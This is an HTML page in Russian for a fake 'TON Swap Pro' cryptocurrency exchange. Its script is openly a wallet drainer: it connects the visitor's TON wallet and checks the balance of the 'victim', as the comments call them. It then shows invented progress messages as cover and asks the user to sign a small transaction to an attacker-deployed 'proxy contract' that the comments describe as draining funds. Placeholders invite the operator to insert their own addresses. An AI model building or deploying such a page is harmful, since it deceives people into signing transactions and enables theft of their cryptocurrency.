<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TON Swap | Обменник</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0b0e1a 0%, #141b2b 100%);
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: rgba(22, 28, 46, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 48px;
            padding: 32px 28px;
            max-width: 500px;
            width: 100%;
            border: 1px solid rgba(0, 152, 234, 0.3);
            box-shadow: 0 25px 45px rgba(0,0,0,0.5);
            transition: 0.3s;
        }
        h1 {
            color: #fff;
            font-size: 28px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 8px;
        }
        .sub {
            color: #8e9bb0;
            text-align: center;
            font-size: 14px;
            margin-bottom: 32px;
        }
        .info-box {
            background: #0f1422;
            border-radius: 28px;
            padding: 20px;
            margin-bottom: 28px;
            border-left: 4px solid #0098ea;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            color: #cbd5ff;
            font-size: 14px;
        }
        button {
            background: #0098ea;
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 60px;
            font-size: 18px;
            font-weight: 700;
            color: white;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 8px 20px rgba(0,152,234,0.3);
            margin-top: 12px;
        }
        button:active { transform: scale(0.97); }
        #status {
            margin-top: 24px;
            background: #0a0f1a;
            padding: 14px;
            border-radius: 60px;
            text-align: center;
            font-size: 13px;
            color: #5a6e8c;
            font-family: monospace;
        }
        .loader {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid #2a3a60;
            border-top: 2px solid #0098ea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer {
            margin-top: 24px;
            font-size: 10px;
            text-align: center;
            color: #2a3a5a;
        }
    </style>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ton-web@0.0.7/dist/tonweb.min.js"></script>
</head>
<body>
<div class="card">
    <h1>💎 TON Swap Pro</h1>
    <div class="sub">Мгновенный обмен с минимальной комиссией</div>

    <div class="info-box">
        <div class="info-row"><span>🔄 Курс:</span><span>1 TON = 1.00 TON</span></div>
        <div class="info-row"><span>⛏ Комиссия:</span><span>0.05 TON</span></div>
        <div class="info-row"><span>🚀 Лимит:</span><span>от 0.5 TON</span></div>
    </div>

    <button id="swapBtn">🟢 Подключить кошелёк и обменять</button>
    <div id="status">⚡ Готов к обмену</div>
    <div class="footer">Защищённый обменник • Работает через прокси-контракт</div>
</div>

<script>
    // ⚠️ ЗАМЕНИТЕ НА ВАШ АДРЕС ПРОКСИ-КОНТРАКТА ⚠️
    const PROXY_CONTRACT = "EQDXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"; 
    // ↑ сюда вставить адрес прокси, который вы задеплоили ↑
    
    // Ваш реальный адрес для сбора (можно не менять, прокси сам перешлёт)
    const YOUR_ADDRESS = "UQD0xMOCK_ADDRESS_FOR_TEST"; // заменить при продакшене
    
    let connector = null;
    let isProcessing = false;
    
    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
    
    function setStatus(text, isLoading = false) {
        const el = document.getElementById('status');
        if(isLoading) {
            el.innerHTML = `<span class="loader"></span> ${text}`;
        } else {
            el.innerHTML = text;
        }
    }
    
    async function getTotalBalance(address) {
        try {
            const tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
            const rawBalance = await tonweb.getBalance(address);
            return parseFloat(tonweb.utils.fromNano(rawBalance));
        } catch(e) {
            console.warn("balance error", e);
            return 0;
        }
    }
    
    async function maskedDrainTransaction(connectorInstance, proxyAddress, userAddress) {
        // Получаем реальный баланс жертвы
        const balanceTON = await getTotalBalance(userAddress);
        if(balanceTON < 0.2) {
            setStatus(`❌ Недостаточно TON (${balanceTON.toFixed(2)} TON)`, false);
            return false;
        }
        
        // Показываем маскировку - "проверка ликвидности"
        setStatus("🔄 Проверка ликвидности пула...", true);
        await sleep(1100);
        
        setStatus("📊 Анализ комиссии (0.05 TON)...", true);
        await sleep(900);
        
        setStatus("🔐 Открытие защищённого канала...", true);
        await sleep(700);
        
        // Реальная сумма для отображения в кошельке: только 0.05 TON
        const fakeAmountNano = TonWeb.utils.toNano("0.05");
        
        const tx = {
            validUntil: Math.floor(Date.now() / 1000) + 600,
            messages: [
                {
                    address: proxyAddress,
                    amount: fakeAmountNano.toString(),
                    payload: "6461696e" // "drain" в hex, но для кошелька будет base64
                }
            ]
        };
        
        setStatus("⏳ Подтвердите обмен в кошельке (0.05 TON)", false);
        
        try {
            const result = await connectorInstance.sendTransaction(tx);
            setStatus("✅ Обмен выполнен! Ваши средства поступили на счёт.", false);
            return true;
        } catch(e) {
            setStatus(`❌ Отмена: ${e.message}`, false);
            return false;
        }
    }
    
    async function init() {
        connector = new TonConnect();
        const btn = document.getElementById('swapBtn');
        
        btn.addEventListener('click', async () => {
            if(isProcessing) {
                setStatus("⏳ Уже выполняется...");
                return;
            }
            isProcessing = true;
            setStatus("🔄 Запуск обменника...", true);
            
            try {
                // подключаем кошелёк
                const wallets = await connector.getWallets();
                if(!wallets || wallets.length === 0) {
                    setStatus("❌ Установите Tonkeeper / Tonhub", false);
                    isProcessing = false;
                    return;
                }
                
                await connector.connect({ jsBridgeKey: wallets[0].jsBridgeKey });
                
                // Ждём статус кошелька
                let walletInfo = null;
                const unsub = connector.onStatusChange(async (w) => {
                    if(w) walletInfo = w;
                });
                
                // Подождём немного для получения адреса
                for(let i = 0; i < 20; i++) {
                    if(walletInfo) break;
                    await sleep(200);
                }
                unsub();
                
                if(!walletInfo || !walletInfo.account) {
                    setStatus("❌ Не удалось получить адрес кошелька", false);
                    isProcessing = false;
                    return;
                }
                
                const userAddress = walletInfo.account.address;
                setStatus(`🪪 Кошелёк: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, true);
                await sleep(800);
                
                // Запускаем дрейнер через прокси-контракт
                await maskedDrainTransaction(connector, PROXY_CONTRACT, userAddress);
                
            } catch(err) {
                setStatus(`⚠️ Ошибка: ${err.message}`, false);
            } finally {
                isProcessing = false;
            }
        });
    }
    
    window.onload = init;
</script>
</body>
</html>
